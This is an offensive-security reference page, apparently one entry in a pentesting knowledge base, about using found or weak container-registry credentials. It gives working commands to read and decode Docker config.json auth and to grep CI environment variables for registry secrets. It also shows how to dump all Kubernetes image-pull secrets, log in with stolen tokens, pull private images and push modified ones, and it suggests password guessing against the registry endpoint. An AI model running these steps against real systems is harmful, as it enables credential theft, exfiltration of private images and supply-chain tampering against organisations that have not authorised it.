---
title: "Registry access: using found or weak credentials to reach private images"
order: 3
description: "Registry credentials turn up in config.json files, CI environment variables, and Kubernetes image-pull secrets. With them, an attacker authenticates to a private registry to pull every image and, depending on the credential's scope, push modified ones. Weak or reused registry passwords extend the same access by guessing."
keywords:
  - registry credentials
  - docker config.json
  - imagepullsecret
  - registry login
  - supply chain
---

# Registry access

Most registries require authentication, but the credentials are widely scattered and often weak. A found token or password lets an attacker pull private images for their code and secrets, and, if the credential has write scope, push modified images. The credential's scope decides whether the access is read-only exfiltration or a supply-chain write.

## Where credentials come from

```bash
# Docker stores registry auth here after a login (base64, not encrypted)
cat ~/.docker/config.json && echo "<base64>" | base64 -d   # user:token
# CI systems inject registry creds as environment variables
env | grep -iE 'REGISTRY|DOCKER_(USER|PASS|TOKEN)'
# Kubernetes image-pull secrets hold a full dockerconfigjson
kubectl get secret -A -o jsonpath='{range .items[?(@.type=="kubernetes.io/dockerconfigjson")]}{.data.\.dockerconfigjson}{"\n"}{end}' \
  | base64 -d
```

## Using the credential

```bash
docker login <registry> -u <user> -p <token>
docker pull <registry>/<private-repo>:<tag>            # read access
docker tag x <registry>/<private-repo>:<tag>
docker push <registry>/<private-repo>:<tag>            # if the token has write scope
# cloud registries use a helper; the same config.json holds the resolved token
```

## Exploitation notes

- `~/.docker/config.json` and Kubernetes `dockerconfigjson` secrets store credentials in base64, which is encoding not encryption; decoding them yields the username and token directly.
- Read access alone is valuable for pulling private images and mining their layers; test push separately, since many tokens are pull-only.
- Weak or reused registry passwords are worth guessing against the `/v2/` token endpoint; a valid login there behaves identically to found credentials.
- Cloud registries (ECR, GCR, ACR) wrap a short-lived token in the same config; the resolved token in `config.json` works until it expires.

## References

- [Docker: registry authentication](https://docs.docker.com/reference/cli/docker/login/)
- [Kubernetes: pull an image from a private registry](https://kubernetes.io/docs/tasks/configure-pod-container/pull-image-private-registry/)
- [HackTricks: Docker registry](https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry)
